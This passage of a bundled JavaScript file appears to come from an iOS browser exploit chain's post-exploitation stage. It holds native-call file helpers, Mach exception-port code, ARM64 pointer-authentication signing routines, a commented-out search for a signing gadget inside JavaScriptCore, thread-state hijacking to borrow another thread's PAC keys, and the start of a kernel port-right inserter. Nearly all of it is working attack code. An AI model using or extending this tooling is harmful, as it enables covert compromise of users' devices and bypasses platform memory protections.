			console.log(TAG, "Unable to open: " + path);
			return false;
		}
		return fd;
	}

	static close(fd) {
		Native.callSymbol("close", fd);
	}

	static read(fd, size=0) {
		if (!size || size > Native.memSize)
			size = Native.memSize;
		const len = Native.callSymbol("read", fd, Native.mem, size);
		if (!len || len == ERROR)
			return false;
		const buff = Native.read(Native.mem, len);
		return buff;
	}

	static readFile(path, seek=0, length=0) {
		const fd = this.open(path);
		if (fd === false)
			return null;

		let data = new Uint8Array();

		if (seek)
			Native.callSymbol("lseek", fd, seek, SEEK_SET);

		let remaining = length;

		while (true) {
			let size = remaining ? remaining : Native.memSize;
			if (size > Native.memSize)
				size = Native.memSize;
			const buff = this.read(fd, size);
			if (buff === false)
				break;
			const buff8 = new Uint8Array(buff);
			let newData = new Uint8Array(data.length + buff8.length);
			newData.set(data, 0);
			newData.set(buff8, data.length);
			data = newData;

			if (remaining) {
				remaining -= buff.byteLength;
				if (!remaining)
					break;
			}
		}

		this.close(fd);

		return data.buffer;
	}

	static writeFile(path, data) {
		return this.#commonWriteFile(path, data, O_WRONLY | O_CREAT | O_TRUNC);
	}

	static appendFile(path, data) {
		return this.#commonWriteFile(path, data, O_WRONLY | O_CREAT | O_APPEND);
	}

	static deleteFile(path) {
		Native.callSymbol("unlink", path);
	}
	static foreachDir(path, func) {
		let dir = Native.callSymbol("opendir", path);
		if (!dir) {
			console.log(TAG, "Unable to open dir: " + path);
			return;
		}

		while (true) {
			let item = this.#readdir(dir);
			if (!item)
				break;

			switch (item.d_type) {
				case DT.DT_DIR:
					if (item.d_name.startsWith("."))
						break;
					func(item.d_name);
					break;
			}
		}

		Native.callSymbol("closedir", dir);
	}

	static foreachFile(path, func) {
		let dir = Native.callSymbol("opendir", path);
		if (!dir) {
			console.log(TAG, "Unable to open dir: " + path);
			return false;
		}

		while (true) {
			let item = this.#readdir(dir);
			if (!item)
				break;

			switch (item.d_type) {
				case DT.DT_REG:
					func(item.d_name);
					break;
			}
		}

		Native.callSymbol("closedir", dir);
		return true;
	}

	static createDir(path, permission=0o755) {
		return !Native.callSymbol("mkdir", path, permission);
	}

	static deleteDir(path, recursive=false) {
		if (recursive) {
			const dir = Native.callSymbol("opendir", path);
			if (!dir) {
				console.log(TAG, "deleteDir: Unable to open dir: " + path);
				return false;
			}

			while (true) {
				const item = this.#readdir(dir);
				if (!item)
					break;

				const newPath = path + '/' + item.d_name;

				switch (item.d_type) {
					case DT.DT_DIR:
						if (item.d_name.startsWith("."))
							break;
						this.deleteDir(newPath, true);
						break;

					case DT.DT_REG:
						console.log(TAG, `deleting: ${newPath}`);
						this.deleteFile(newPath);
						break;
				}
			}

			Native.callSymbol("closedir", dir);
		}

		return !Native.callSymbol("rmdir", path);
	}

	static exists(path, permission=0/*F_OK*/) {
		return !Native.callSymbol("access", path, permission);
	}

	static stat(path) {
		const ret = Native.callSymbol("stat", path, Native.mem);
		if (ret == ERROR)
			return null;
		const buff = Native.read(Native.mem, 144);
		const view = new DataView(buff);

		const dev = view.getInt32(0, true);
		const mode = view.getUint16(0x4, true);
		const nlink = view.getUint16(0x6, true);
		const ino = view.getBigUint64(0x8, true);
		const uid = view.getUint32(0x10, true);
		const gid = view.getUint32(0x14, true);
		const atime_tv_sec = view.getBigInt64(0x20, true);
		const mtime_tv_sec = view.getBigInt64(0x30, true);
		const ctime_tv_sec = view.getBigInt64(0x40, true);
		const size = view.getBigInt64(0x60, true);

		return {
			mode: Number(mode),
			ino: Number(ino),
			dev: Number(dev),
			nlink: Number(nlink),
			uid: Number(uid),
			gid: Number(gid),
			size: Number(size),
			atime: Number(atime_tv_sec),
			mtime: Number(mtime_tv_sec),
			ctime: Number(ctime_tv_sec)
		};
	}

	static #readdir(dir) {
		const itemPtr = Native.callSymbol("readdir", dir);
		if (!itemPtr)
			return null;

		const item = Native.read(itemPtr, 24);
		const view = new DataView(item);

		const d_ino = view.getBigUint64(0, true);
		const d_namlen = view.getUint16(18, true);
		const d_type = view.getUint8(20);
		const d_name = Native.readString(itemPtr + 21n, d_namlen + 1);

		return {
			d_ino: d_ino,
			d_type: d_type,
			d_name: d_name
		};
	}

	static #commonWriteFile(path, data, flags) {
		const fd = Native.callSymbol("open", path, flags, 0o644);
		if (fd == ERROR) {
			console.log(TAG, "Unable to open: " + path);
			return false;
		}

		// For some reason file mode is not applied on open()
		Native.callSymbol("fchmod", fd, 0o644);

		let offs = 0;
		let left = data.byteLength;

		const buffSize = 0x4000;
		const buffPtr = Native.callSymbol("malloc", buffSize);

		while (true) {
			const size = left > buffSize ? buffSize : left;
			const src8 = new Uint8Array(data, offs, size);
			const dst8 = new Uint8Array(src8);
			Native.write(buffPtr, dst8.buffer);
			const len = Native.callSymbol("write", fd, buffPtr, size);
			if (!len || len == ERROR)
				break;
			offs += len;
			left -= len;
			if (!left)
				break;
		}

		Native.callSymbol("free", buffPtr);
		Native.callSymbol("close", fd);

		return true;
	}
}


/***/ }),

/***/ "./src/libs/JSUtils/Utils.js":
/*!***********************************!*\
  !*** ./src/libs/JSUtils/Utils.js ***!
  \***********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Utils)
/* harmony export */ });


const TAG = "UTILS";

const DT = {
	DT_UNKNOWN: 0,
	DT_FIFO: 1,
	DT_CHR: 2,
	DT_DIR: 4,
	DT_BLK: 6,
	DT_REG: 8,
	DT_LNK: 10,
	DT_SOCK: 12,
	DT_WHT: 14
};

class Utils {

	static UINT64_SIZE = 8;
	static UINT32_SIZE = 4;
	static UINT16_SIZE = 2;
	static ARM_THREAD_STATE64 = 6;
	static ARM_THREAD_STATE64_SIZE = 0x110;
	static ARM_THREAD_STATE64_COUNT = (this.ARM_THREAD_STATE64_SIZE / this.UINT32_SIZE);
	static ptrauth_key_asia = 0;
	static EXC_BAD_ACCESS = 1n;
	static EXC_GUARD = 12n;
	static EXC_MASK_GUARD = (1n << this.EXC_GUARD);
	static EXC_MASK_BAD_ACCESS = (1n << this.EXC_BAD_ACCESS);
	static EXCEPTION_STATE = 2n;
	static MACH_EXCEPTION_CODES = 0x80000000n;
	static PAGE_SIZE = 0x4000n;
	static PAGE_MASK = (this.PAGE_SIZE - 1n);

	static hex(val) {
		return val.toString(16);
	}

	static memmem(haystack, needle) {
		const hLen = haystack.byteLength;
		const nLen = needle.byteLength;

		if (nLen === 0 || hLen < nLen) {
		  return 0;
		}

		const haystackView = new Uint8Array(haystack);
		const needleView = new Uint8Array(needle);

		for (let i = 0; i <= hLen - nLen; i++) {
		  let found = true;
		  for (let j = 0; j < nLen; j++) {
			if (haystackView[i + j] !== needleView[j]) {
			  found = false;
			  break;
			}
		  }
		  if (found) {
			return i;
		  }
		}

		return 0;
	}

	static ptrauth_string_discriminator(discriminator)
	{
		switch (discriminator) {
			case "pc":
				return 0x7481n;
			case "lr":
				return 0x77d3n;
			case "sp":
				return 0xcbedn;
			case "fp":
				return 0x4517n;
			default:
				console.log(TAG,`Cannot find discriminator for value:${discriminator}`);
				return 0n;
		}
	}

	static ptrauth_string_discriminator_special(discriminator)
	{
		switch (discriminator) {
			case "pc":
				return 0x7481000000000000n;
			case "lr":
				return 0x77d3000000000000n;
			case "sp":
				return 0xcbed000000000000n;
			case "fp":
				return 0x4517000000000000n;
			default:
				console.log(TAG,`Cannot find discriminator for value:${discriminator}`);
				return 0n;
		}
	}

	static ptrauth_blend_discriminator(diver,discriminator)
	{
		return diver & 0xFFFFFFFFFFFFn | discriminator;
	}

    static printArrayBufferInChunks(buffer) {
        const view = new DataView(buffer);
        const chunkSize = 8;

        for (let i = 0; i < buffer.byteLength; i += chunkSize) {
			// Read the chunk as a BigInt
			const chunk = view.getBigUint64(i, true); // Little-endian

            console.log(TAG, `0x${Utils.hex(i)}: ${Utils.hex(chunk)}`);
        }
    }

	static MIN(a, b)
	{
		if(a < b)
			return a;
		return b;
	}

	static MAX(a, b)
	{
		if(a > b)
			return a;
		return b;
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/Exception.js":
/*!***************************************!*\
  !*** ./src/libs/TaskRop/Exception.js ***!
  \***************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Exception)
/* harmony export */ });
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./ExceptionMessageStruct */ "./src/libs/TaskRop/ExceptionMessageStruct.js");
/* harmony import */ var _ExceptionReplyStruct__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./ExceptionReplyStruct */ "./src/libs/TaskRop/ExceptionReplyStruct.js");
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");


const TAG = "EXCEPTION";

const MPO_INSERT_SEND_RIGHT = 0x10;
const MPO_PROVISIONAL_ID_PROT_OPTOUT = 0x8000;
const MACH_SEND_MSG = 0x00000001n;
const MACH_RCV_MSG = 0x00000002n;
const MACH_SEND_TIMEOUT = 0x00000010n;
const MACH_RCV_TIMEOUT = 0x00000100n;
const MACH_MSG_TYPE_MOVE_SEND_ONCE = 18;

class Exception
{
	static ExceptionMessageSize = 0x160n;
	static ExceptionReplySize = 0x13cn;

	static createPort()
	{
		let options = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		const buffer = new ArrayBuffer(8);
		const view = new DataView(buffer);
		view.setUint32(0, MPO_INSERT_SEND_RIGHT | MPO_PROVISIONAL_ID_PROT_OPTOUT, true);
		view.setUint32(4, 0, true);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(options, buffer);
		let exceptionPortPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem + 0x100n;
		let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_port_construct",0x203, options, 0n, exceptionPortPtr);
		if (kr != 0)
		{
			console.log(TAG,`Error creating exception port:${kr}`);
			return 0;
		}
		let port = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(exceptionPortPtr);
		return BigInt(port);
	}

	static waitException(exceptionPort, excBuffer, timeout, debug)
	{
		let t1 = new Date().getTime();
		if (debug)
			console.log(TAG,`Waiting exception...`);
		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg",
			excBuffer,
			MACH_RCV_MSG | MACH_RCV_TIMEOUT,
			0, this.ExceptionMessageSize,
			exceptionPort,
			timeout,
			0);
		if (ret != 0)
		{
			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string",ret);
			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(errString);
			//console.log(TAG,`Error receiving exception message:${errString}`);
			return false;
		}
		if (debug)
		{
			let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(excBuffer,Number(this.ExceptionMessageSize));
			let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_2__["default"](excRes);
			let elapsed = new Date().getTime() - t1;
			//console.log(TAG,`Got exception succesfully after ${elapsed} ms with [id:${exc.Head.msgh_id}, exc=${exc.exception}, code=${Utils.hex(exc.codeFirst)}]`);
			//console.log(TAG,`PC:${Utils.hex(exc.threadState.opaque_pc)}`);
			//console.log(TAG,`LR:${Utils.hex(exc.threadState.opaque_lr)}`);
			//console.log(TAG,`SP:${Utils.hex(exc.threadState.opaque_sp)}`);
			//console.log(TAG,`FP:${Utils.hex(exc.threadState.opaque_fp)}`);
			//for(let i = 0; i < 29; i++)
			//	console.log(TAG,`x[${i}]:${Utils.hex(exc.threadState.registers.get(i))}`);
		}
		return true;
	}

	static replyWithState(exc,state,debug)
	{
		let replyBuf = new ArrayBuffer(Number(this.ExceptionReplySize));
		let reply = new _ExceptionReplyStruct__WEBPACK_IMPORTED_MODULE_3__["default"](replyBuf);
		let sendSize = Number(this.ExceptionReplySize);
		let recvSize = 0n;
		if(debug)
		{
			console.log(TAG,`Reply with state:`);
			console.log(TAG,`PC:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(state.opaque_pc)}`);
			console.log(TAG,`LR:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(state.opaque_lr)}`);
			console.log(TAG,`SP:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(state.opaque_sp)}`);
			console.log(TAG,`FP:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(state.opaque_fp)}`);
		}
		
		reply.Head.msgh_bits = _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_4__["default"].MACH_MSGH_BITS(MACH_MSG_TYPE_MOVE_SEND_ONCE, 0);
		reply.Head.msgh_size = sendSize;
		reply.Head.msgh_remote_port = exc.Head.msgh_remote_port;
		reply.Head.msgh_local_port = 0;
		reply.Head.msgh_id = exc.Head.msgh_id + 100;
		reply.NDR = exc.NDR;
		reply.RetCode = 0;
		reply.flavor = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64;
		reply.new_stateCnt = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_COUNT;
		//TODO make it inside ThreadState to copy thread state to another variable
		for(let i = 0; i < 29; i++)
		{
			reply.threadState.registers.set(i,state.registers.get(i));
		}
		reply.threadState.opaque_fp = state.opaque_fp;
		reply.threadState.opaque_lr = state.opaque_lr;
		reply.threadState.opaque_sp = state.opaque_sp;
		reply.threadState.opaque_pc = state.opaque_pc;
		reply.threadState.cspr = state.cspr;
		reply.threadState.opaque_flags = state.opaque_flags;
		let replyMem = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(replyMem,replyBuf);
		if(debug)
			libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].printArrayBufferInChunks(replyBuf);
		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg",
				replyMem,
				MACH_SEND_MSG,
				sendSize, recvSize,
				0n,
				0n,
				0n);

		if (ret != 0)
			console.log(TAG,`Error replying exception:${libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string",ret)}`);
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/ExceptionMessageStruct.js":
/*!****************************************************!*\
  !*** ./src/libs/TaskRop/ExceptionMessageStruct.js ***!
  \****************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ ExceptionMessageStruct)
/* harmony export */ });
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./ThreadState */ "./src/libs/TaskRop/ThreadState.js");


class ExceptionMessageStruct 
{
	#buffer;
	#dataView;

	constructor(buffer) {
		this.#buffer = buffer;
		this.#dataView = new DataView(this.#buffer);
		this.Head = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__["default"](this.#buffer);
		this.threadState = new _ThreadState__WEBPACK_IMPORTED_MODULE_1__["default"](this.#buffer,64);
	}

	get NDR() { return this.#dataView.getBigUint64(24,true); }
	set NDR(value) { this.#dataView.setBigUint64(24,value,true); }

	get exception() { return this.#dataView.getUint32(32,true); }
	set exception(value) { this.#dataView.setUint32(32,value,true); }

	get codeCnt() { return this.#dataView.getUint32(36,true); }
	set codeCnt(value) { this.#dataView.setUint32(36,value,true); }

	get codeFirst() { return this.#dataView.getBigUint64(40,true); }
	set codeFirst(value) { this.#dataView.setBigUint64(40,value,true); }

	get codeSecond() { return this.#dataView.getBigUint64(48,true); }
	set codeSecond(value) { this.#dataView.setBigUint64(48,value,true); }

	get flavor() { return this.#dataView.getUint32(56,true); }
	set flavor(value) { this.#dataView.setUint32(56,value,true); }

	get old_stateCnt() { return this.#dataView.getUint32(60,true); }
	set old_stateCnt(value) { this.#dataView.setUint32(60,value,true); }

	get paddingFirst() { return this.#dataView.getBigUint64(336,true); }
	set paddingFirst(value) { this.#dataView.setBigUint64(336,value,true); }
	
	get paddingSecond() { return this.#dataView.getBigUint64(344,true); }
	set paddingSecond(value) { this.#dataView.setBigUint64(344,value,true); }
}

/***/ }),

/***/ "./src/libs/TaskRop/ExceptionReplyStruct.js":
/*!**************************************************!*\
  !*** ./src/libs/TaskRop/ExceptionReplyStruct.js ***!
  \**************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ ExceptionReplyStruct)
/* harmony export */ });
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./ThreadState */ "./src/libs/TaskRop/ThreadState.js");


class ExceptionReplyStruct 
{
	#buffer;
	#dataView;

	constructor(buffer) {
		this.#buffer = buffer;
		this.#dataView = new DataView(this.#buffer);
		this.Head = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__["default"](this.#buffer);
		this.threadState = new _ThreadState__WEBPACK_IMPORTED_MODULE_1__["default"](this.#buffer,44);
	}

	get NDR() { return this.#dataView.getBigUint64(24,true); }
	set NDR(value) { this.#dataView.setBigUint64(24,value,true); }

	get RetCode() { return this.#dataView.getUint32(32,true); }
	set RetCode(value) { this.#dataView.setUint32(32,value,true); }

	get flavor() { return this.#dataView.getUint32(36,true); }
	set flavor(value) { this.#dataView.setUint32(36,value,true); }
	
	get new_stateCnt() { return this.#dataView.getUint32(40,true); }
	set new_stateCnt(value) { this.#dataView.setUint32(40,value,true); }
}

/***/ }),

/***/ "./src/libs/TaskRop/MachMsgHeaderStruct.js":
/*!*************************************************!*\
  !*** ./src/libs/TaskRop/MachMsgHeaderStruct.js ***!
  \*************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ MachMsgHeaderStruct)
/* harmony export */ });
class MachMsgHeaderStruct
{
	#dataView;

	constructor(buffer, offset = 0) {
		this.#dataView = new DataView(buffer,offset);
	}

	get msgh_bits() { return this.#dataView.getUint32(0,true); }
	set msgh_bits(value) { this.#dataView.setUint32(0,value,true); }

	get msgh_size() { return this.#dataView.getUint32(4,true); }
	set msgh_size(value) { this.#dataView.setUint32(4,value,true); }

	get msgh_remote_port() { return this.#dataView.getUint32(8,true); }
	set msgh_remote_port(value) { this.#dataView.setUint32(8,value,true); }

	get msgh_local_port() { return this.#dataView.getUint32(12,true); }
	set msgh_local_port(value) { this.#dataView.setUint32(12,value,true); }

	get msgh_voucher_port() { return this.#dataView.getUint32(16,true); }
	set msgh_voucher_port(value) { this.#dataView.setUint32(16,value,true); }
	
	get msgh_id() { return this.#dataView.getUint32(20,true); }
	set msgh_id(value) { this.#dataView.setUint32(20,value,true); }

	static MACH_MSGH_BITS(remote, local)
	{
		return ((remote) | ((local) << 8));
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/PAC.js":
/*!*********************************!*\
  !*** ./src/libs/TaskRop/PAC.js ***!
  \*********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ PAC)
/* harmony export */ });
//import Chain from "libs/Chain/Chain";
//import Native from "libs/JSUtils/Native";
//import Utils from "libs/JSUtils/Utils";
//import Exception from "./Exception";
//import Task from "./Task";
//import Thread from "./Thread";
//import ThreadState from "./ThreadState";
//import ExceptionMessageStruct from "./ExceptionMessageStruct";
//import Offsets from "Driver/Offsets";

const TAG = "PAC";

class PAC
{
	static gadget_pacia;

	static {
		//this.#findGadgets();
	}
	static remotePACLocal(address, modifier)
	{
		address = address & 0x7fffffffffn;
		//console.log(TAG,`address:${Utils.hex(address)}, modifier:${Utils.hex(modifier)}`);
		let signedAddress = pacia(address, BigInt(modifier));
		//console.log(TAG,`signedAddress:${Utils.hex(signedAddress)}`);
		return signedAddress;
	}
	static remotePAC(threadAddr, address, modifier)
	{
		return Native.pacia(address, modifier);
		
		//return this.remotePACLocal(address, modifier);
		/*
		if (!this.gadget_pacia)
		{
			console.log(TAG,`Doesn't have gadget_pacia, aborting`);
			return 0;
		}
		address = address & 0x7fffffffffn;

		let signedAddress = 0n;

		// Get PAC keys of remote thread
		let keyA = Thread.getRopPid(threadAddr);
		let keyB = Thread.getJopPid(threadAddr);

		//console.log(TAG,`Key A:${Utils.hex(keyA)}`);
		//console.log(TAG,`Key B:${Utils.hex(keyB)}`);

		let kr = 0;
		let pacThread = Native.mem;
		Native.callSymbol("thread_create", 0x203, pacThread);
		let buffRes = Native.read(pacThread, Utils.UINT32_SIZE);
		let viewRes = new DataView(buffRes);
		pacThread = viewRes.getUint32(0,true);
		//console.log(TAG,`pacThread:${Utils.hex(pacThread)}`);
		let stack = Native.callSymbol("malloc",0x4000n);
		let sp = stack + 0x2000n;
		let stateBuff = new ArrayBuffer(Utils.ARM_THREAD_STATE64_SIZE);
		let state = new ThreadState(stateBuff);
		state.opaque_sp = sp;
		//arm_thread_state64_set_pc_fptr(state, (void*)gadget_pacia);
		let outputBuffer = Native.mem;
		//console.log(TAG,`Before pacia`);
		if(pacia)
			state.opaque_pc = pacia(this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"));
		else
			state.opaque_pc = Native.callSymbol("pacia",this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"),Utils.ptrauth_key_asia);	
		const buildVer = Offsets.getBuildVersion();
		if(buildVer && buildVer.startsWith("22"))
		{
			//console.log(TAG, "Applying 18 fix");
			//state.opaque_lr = 0x401n;
			state.opaque_lr = pacia(0x401n,Utils.ptrauth_string_discriminator("lr"));
		}
		//console.log(TAG,`After pacia with pc:${state.opaque_pc}`);
		//state.opaque_pc = Native.callSymbol("pacia",this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"),Utils.ptrauth_key_asia);
		state.registers.set(0,outputBuffer);
		state.registers.set(1,BigInt(address));
		state.registers.set(2,BigInt(modifier));
		state.registers.set(3,BigInt(pacThread));
		state.registers.set(16,BigInt(address));
		state.registers.set(17,BigInt(modifier));

		let exceptionPort = Exception.createPort();
		if (!exceptionPort)
		{
			console.log(TAG,`Cannot create exception port`);
			this.#cleanup(pacThread,exceptionPort,stack);
			return 0n;
		}

		//console.log(TAG,`Exception port:${Utils.hex(exceptionPort)}`);

		kr = Native.callSymbol("thread_set_exception_ports",
			pacThread,
			Utils.EXC_MASK_BAD_ACCESS,
			exceptionPort,
			Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES,
			BigInt(Utils.ARM_THREAD_STATE64));
		
		if (kr != 0)
		{
			console.log(`thread_set_exception_ports failed:${kr}`);
			this.#cleanup(pacThread,exceptionPort,stack);
			return 0n;
		}
		let pacThreadAddr = Task.getPortKObject(BigInt(pacThread));
		//console.log(TAG,`PAC thread address:${Utils.hex(pacThreadAddr)}`);
		if (!this.#setThreadState(pacThread, pacThreadAddr, stateBuff))
		{
			console.log(TAG,`Failed to set thread state`);
			this.#cleanup(pacThread,exceptionPort,stack);
			return 0n;
		}
		// Change pacThread PAC keys with those of remote thread
		Thread.setPACKeys(pacThreadAddr, keyA, keyB);
		//console.log(TAG,`Starting PAC thread...`);
		Native.callSymbol("thread_resume",pacThread);
		let excBuffer = Native.mem;
		if (!Exception.waitException(exceptionPort, excBuffer, 100, false))
		{
			console.log(TAG,`Failed to receive exception from PAC thread`);
			this.#cleanup(pacThread,exceptionPort,stack);
			return 0n;
		}
		let excRes = Native.read(excBuffer,Number(Exception.ExceptionMessageSize));
		let exc = new ExceptionMessageStruct(excRes);
		signedAddress = exc.threadState.registers.get(16);
		//console.log(TAG,`Signed address: ${Utils.hex(address)} -> signedAddress:${Utils.hex(signedAddress)}`);
		this.#cleanup(pacThread, exceptionPort, stack);
		return signedAddress;
		*/
	}

	/*
	static #findGadgets()
	{
		let sym = Native.dlsym("_ZNK3JSC13JSArrayBuffer8isSharedEv");
		if (!sym)
		{
			console.log(TAG,`Symbol not found`);
			return false;
		}

		let symStripped = sym & ~0xffffff8000000000n;
		let gadgetOpcodesBuff = new ArrayBuffer(20);
		let gadgetOpcodesView = new DataView(gadgetOpcodesBuff);
		gadgetOpcodesView.setUint32(0,0xDAC10230,true);
		gadgetOpcodesView.setUint32(4,0x9A9003E8,true);
		gadgetOpcodesView.setUint32(8,0xF100011F,true);
		gadgetOpcodesView.setUint32(12,0x1A9F07E0,true);
		gadgetOpcodesView.setUint32(16,0xD65F03C0,true);
		let data = Native.read(symStripped,0x1000);
		let gadgetOffset = Utils.memmem(data,gadgetOpcodesBuff);
		if (!gadgetOffset)
		{
			console.log(TAG,`pacia_gadget offset not found`);
			return false;
		}
		this.gadget_pacia = symStripped + BigInt(gadgetOffset);

		console.log(TAG,`Gadgets found: pacia=${Utils.hex(this.gadget_pacia)}`);

		return true;
	}

	static #setThreadState(thread,threadAddr,stateBuff)
	{
		let options = Thread.getOptions(threadAddr);
		options |= 0x8000;	
		Thread.setOptions(threadAddr, options);
		let stateMem = Native.mem;
		Native.write(stateMem,stateBuff);
		//console.log(TAG,`thread:${Utils.hex(thread)}`);
		let kr = Native.callSymbol("thread_set_state",
			thread,
			BigInt(Utils.ARM_THREAD_STATE64),
			stateMem,
			BigInt(Utils.ARM_THREAD_STATE64_COUNT));
		if (kr != 0)
		{
			console.log(TAG,`Failed thread_set_state with error:${kr}`);
			return false;
		}

		options &= ~0x8000;
		Thread.setOptions(threadAddr, options);
		return true;
	}

	static #cleanup(pacThread,exceptionPort,stack)
	{
		Native.callSymbol("thread_terminate",pacThread);
		Native.callSymbol("mach_port_destruct",0x203, exceptionPort, 0n, 0n);
		Native.callSymbol("free",stack);
	}
	*/
}

/***/ }),

/***/ "./src/libs/TaskRop/PortRightInserter.js":
/*!***********************************************!*\
  !*** ./src/libs/TaskRop/PortRightInserter.js ***!
  \***********************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ PortRightInserter)
/* harmony export */ });
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");


const TAG = "PORTRIGHTINSERTER";

const TASK_SELF = 0x203;
const MACH_PORT_NULL = 0;
const MACH_PORT_TYPE_SEND = 0x10000;
const MACH_PORT_TYPE_DEAD_NAME = 0x100000;

const MACH_SEND_MSG = 0x00000001n;
const MACH_RCV_MSG = 0x00000002n;
const MACH_SEND_TIMEOUT = 0x00000010n;
const MACH_RCV_TIMEOUT = 0x00000100n;

const MACH_MSG_TYPE_COPY_SEND = 19; 
const MACH_MSG_TYPE_MAKE_SEND = 20;
const MACH_MSG_TYPE_MAKE_SEND_ONCE = 21;

const MACH_MSGH_BITS_COMPLEX = 0x80000000;
const MACH_MSG_PORT_DESCRIPTOR = 0;

const MPO_INSERT_SEND_RIGHT = 0x10;
const MPO_PROVISIONAL_ID_PROT_OPTOUT = 0x8000;

const IO_BITS_KOLABEL = 0x00000400;
const IE_BITS_TYPE_MASK = 0x001f0000;

class PortRightInserter {
	
	static insert(portKaddr) {
		const p = this.#newPort();
		//console.log(TAG, "New port: " + Utils.hex(p));
		const pAddr = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getPortAddr(BigInt(p));
